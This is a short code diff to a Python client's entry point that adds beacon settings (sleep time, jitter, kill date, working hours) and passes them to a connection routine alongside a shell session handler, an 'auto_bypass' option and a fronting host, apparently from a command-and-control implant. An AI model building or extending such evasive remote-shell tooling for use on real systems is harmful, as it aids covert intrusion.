@@ -13,6 +13,16 @@ def main():
     config = load_config()
     platform = get_platform()
 
+    beacon_config = None
+    if config.get('beacon'):
+        from client.core.beacon import BeaconConfig
+        beacon_config = BeaconConfig(
+            sleep_time=config.get('beacon_sleep', 5.0),
+            jitter=config.get('beacon_jitter', 0.3),
+            kill_date=config.get('kill_date'),
+            working_hours=config.get('working_hours'),
+        )
+
     def shell_callback(sock_or_proto, encryption, tls, http_mode):
         handle_session(sock_or_proto, platform, encryption, tls,
                        config['auto_bypass'], http_mode)
@@ -27,6 +37,7 @@ def main():
             config['tls'],
             config.get('http_mode', False),
             config.get('front_host'),
+            beacon_config=beacon_config,
         )
     except KeyboardInterrupt:
         sys.exit()
